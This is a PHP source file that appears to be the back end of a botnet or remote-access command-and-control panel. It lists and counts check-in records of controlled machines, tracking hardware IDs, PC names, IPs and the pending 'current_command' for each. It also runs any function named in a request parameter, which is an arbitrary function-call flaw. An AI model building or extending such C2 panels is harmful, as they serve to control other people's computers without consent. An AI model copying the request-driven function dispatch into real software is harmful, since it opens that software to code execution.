<?php
require_once("auth.php"); 
checkLoggedIn();

$mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if ($mysqli -> connect_errno) {
	echo 'Error connecting to MySQL database. Please check your configuration settings in the config.php file.<br>';
	echo $mysqli -> connect_error;
	exit();
}

function getAll() {
	global $mysqli;
	$result = $mysqli->query("SELECT * FROM users");
	// $result = $mysqli->query("SELECT id, hwid, pcname, username, os, ip, version, UNIX_TIMESTAMP(first_seen) AS first_seen, UNIX_TIMESTAMP(last_seen) AS last_seen, current_command, command_seen FROM users");
	$return = array();
	while($row = $result->fetch_array(MYSQLI_ASSOC))
		array_push($return, $row);
	$mysqli->close();
	echo json_encode($return);
}

function getOnline() {
	global $mysqli;
	$result = $mysqli->query("SELECT * FROM users WHERE last_seen > NOW() - INTERVAL " . ACTIVE_TIME . " MINUTE");
	// $result = $mysqli->query("SELECT id, hwid, pcname, username, os, ip, version, UNIX_TIMESTAMP(first_seen) AS first_seen, UNIX_TIMESTAMP(last_seen) AS last_seen, current_command, command_seen FROM users WHERE last_seen > NOW() - INTERVAL " . ACTIVE_TIME . " MINUTE");
	$return = array();
	while($row = $result->fetch_array(MYSQLI_ASSOC))
		array_push($return, $row);
	echo json_encode($return);
}

function countAll() {
	global $mysqli;
	$result = $mysqli->query("SELECT COUNT(id) FROM users");
	$return = $result->fetch_array(MYSQLI_NUM);
	echo $return[0];
}

function countOnline() {
	global $mysqli;
	$result = $mysqli->query("SELECT COUNT(id) FROM users WHERE last_seen > NOW() - INTERVAL " . ACTIVE_TIME . " MINUTE");
	$return = $result->fetch_array(MYSQLI_NUM);
	echo $return[0];	
}

if (isset($_REQUEST['function']))
	$_REQUEST['function']();

$mysqli->close();
?>